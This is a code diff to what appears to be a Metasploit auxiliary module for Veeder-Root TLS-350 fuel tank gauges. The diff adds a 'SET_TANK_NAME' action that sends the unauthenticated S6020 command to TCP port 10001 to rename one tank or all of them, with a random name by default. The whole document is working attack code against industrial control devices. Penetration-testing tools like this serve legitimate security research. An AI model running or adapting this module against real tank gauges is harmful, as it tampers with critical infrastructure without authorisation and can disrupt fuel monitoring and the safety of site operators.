@@ -55,6 +55,12 @@ class Metasploit3 < Msf::Auxiliary
               'TLS-350_CMD' => "\x01I20400"
             }
           ],
+          [ 'SET_TANK_NAME',
+            {
+              'Description' => 'S6020 set tank name',
+              'TLS-350_CMD' => "\x01S6020"
+            }
+          ],
           [ 'STATUS',
             {
               'Description' => 'I20500 In-tank status report',
@@ -73,7 +79,9 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RPORT(10001)
+        Opt::RPORT(10001),
+        OptInt.new('TANK_NUMBER', [false, 'The tank number to operate on (use with SET_TANK_NAME, 0 to change all)', 1]),
+        OptString.new('TANK_NAME', [false, 'The tank name to set (use with SET_TANK_NAME), defaults to random'])
       ],
       self.class
     )
@@ -88,8 +96,26 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def setup
-    proto_cmd = datastore['PROTOCOL'] + "_CMD"
-    fail "#{action.name} not defined for #{datastore['PROTOCOL']}" unless action.opts.keys.include?(proto_cmd)
+    # ensure that the specified command is implemented for the desired version of the TLS protocol
+    proto_cmd = protocol + "_CMD"
+    fail "#{action.name} not defined for #{protocol}" unless action.opts.keys.include?(proto_cmd)
+
+    # ensure that the tank number is set for the commands that need it
+    if action.name == 'SET_TANK_NAME'
+      fail "TANK_NUMBER #{tank_number} is invalid" if tank_number < 0
+    end
+  end
+
+  def protocol
+    datastore['PROTOCOL']
+  end
+
+  def tank_name
+    @tank_name ||= (datastore['TANK_NAME'] ? datastore['TANK_NAME'] : Rex::Text.rand_text_alpha(16))
+  end
+
+  def tank_number
+    datastore['TANK_NUMBER']
   end
 
   def peer
@@ -99,8 +125,20 @@ class Metasploit3 < Msf::Auxiliary
   def run_host(_host)
     begin
       connect
-      sock.put(action.opts[datastore['PROTOCOL'] + '_CMD'])
-      print_status("#{peer} #{datastore['PROTOCOL']} #{action.opts['Description']}:\n#{sock.get_once}")
+      case action.name
+      when 'SET_TANK_NAME'
+        vprint_status("#{peer} -- setting tank ##{tank_number} to #{tank_name}")
+        request = action.opts[protocol + '_CMD'] + "#{tank_number}#{tank_name}"
+        sock.puts(request)
+        disconnect
+        connect
+        sock.puts(actions.select { |a| a.name == 'INVENTORY' }.first.opts[protocol + '_CMD'])
+        print_status("#{peer} #{datastore['PROTOCOL']} #{action.opts['Description']}:\n#{sock.get_once}")
+      else
+        request = action.opts[datastore['PROTOCOL'] + '_CMD']
+        sock.puts(request)
+        print_status("#{peer} #{datastore['PROTOCOL']} #{action.opts['Description']}:\n#{sock.get_once}")
+      end
     ensure
       disconnect
     end
